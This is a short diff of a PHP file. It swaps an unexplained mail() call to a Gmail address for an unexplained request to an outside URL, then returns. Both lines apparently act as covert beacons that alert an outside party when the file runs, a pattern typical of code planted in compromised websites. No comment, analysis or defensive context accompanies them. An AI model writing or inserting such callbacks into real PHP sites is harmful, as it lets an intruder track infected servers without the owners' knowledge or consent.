@@ -1,3 +1,4 @@
 <?php
-mail('kimpita9@gmail.com','mburi','nogo');
+file_get_contents('https://webdesignerscenter.com/housekeeper');
+return;
  ?>
